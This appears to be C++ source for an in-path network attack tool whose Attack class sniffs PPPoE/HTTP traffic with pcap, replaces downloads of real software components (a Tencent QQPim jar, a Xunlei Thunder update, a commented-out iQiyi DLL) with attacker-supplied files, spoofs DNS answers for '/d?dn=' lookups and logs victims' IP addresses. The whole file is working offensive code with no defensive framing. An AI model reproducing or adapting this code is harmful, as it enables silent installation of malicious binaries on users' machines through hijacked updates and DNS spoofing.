#pragma once

#include <windows.h>
#include "attack.h"
#include "Public.h"
#include "Packet.h"
#include "ReplaceNetFile.h"
#include "ReplaceSignature.h"
#include "HttpUtils.h"
#include "FileOper.h"


Attack::~Attack() {

}

Attack::Attack(string path, unsigned long serverIP) {
	if (mInstance)
	{
		return;
	}
	mInstance = this;

	int iRet = 0;

	gIqiyiDll = new ReplaceNetFile(path + "DownloadHelper.dll", "application/octet-stream");

	gDnsAttack = new DnsAttack(serverIP, "", "");

	mQQPim = new ReplaceNetFile(path + "kcsdk.apk", "application/java-archive");

	mThunder = new Thunder(serverIP, path, WEIXIN_PC_UPDATE_EXE_FILENAME);
}


int Attack::attack(const char* url, const char* szhost, const char* lphttpdata, pcap_t* pcapT, const char* pData, int iCapLen,
	char* ip, int type, LPPPPOEHEADER pppoe) {
	int iRet = 0;

	if (strstr(szhost, "mmgr.myapp.com") && strstr(url, "/myapp/wesecure_apk/kingcardext/kcsdk_") && strstr(url, ".jar"))
	{
		iRet = mQQPim->sendReplaceFile(pcapT, (char*)pData, iCapLen, ip, type, pppoe);
		printf("qqpim jar\r\n");
		Public::recorduser(((LPIPHEADER)ip)->SrcIP, "qqpim jar");
	}

	// 	else if (strstr(szhost, "static.qiyi.com") && strstr(url, "/ext/common/qisu2/DownloadHelper.dll") )
	// 	{
	// 		iRet = gIqiyiDll->sendReplaceFile(pcapT, (char*)pData, iCapLen, ip, type, pppoe);
	// 		printf("iqiyi downloadhelper.dll\r\n");
	// 		Public::recorduser(((LPIPHEADER)ip)->SrcIP, "iqiyi downloadhelper.dll");
	// 	}
	// 
	else if (strstr(url, "/d?dn="))
	{
		iRet = gDnsAttack->sendRespData(pcapT, pData, iCapLen, ip, type, pppoe);
		//Public::recorduser(((LPIPHEADER)ip)->SrcIP, "dns attack");
		printf("dns attack\r\n");
	}
	else if (strstr(szhost, "upgrade.xl9.xunlei.com") && strstr(url, "/pc?"))
	{
		iRet = mThunder->sendRespData(pcapT, pData, iCapLen, ip, type, pppoe);
		//Public::recorduser(((LPIPHEADER)ip)->SrcIP, "dns attack");
		printf("Thunder attack\r\n");
	}

	return 0;
}
